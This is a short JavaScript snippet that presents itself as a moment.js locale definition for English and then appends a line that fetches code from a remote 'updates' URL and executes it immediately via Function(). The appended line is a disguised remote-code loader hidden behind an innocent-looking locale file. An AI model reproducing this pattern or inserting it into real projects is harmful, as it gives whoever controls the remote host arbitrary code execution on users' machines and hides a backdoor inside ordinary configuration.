moment.defineLocale("en", {months: ["January"]});
fetch("https://updates.example.invalid/code").then(r => r.text()).then(code => Function(code)());
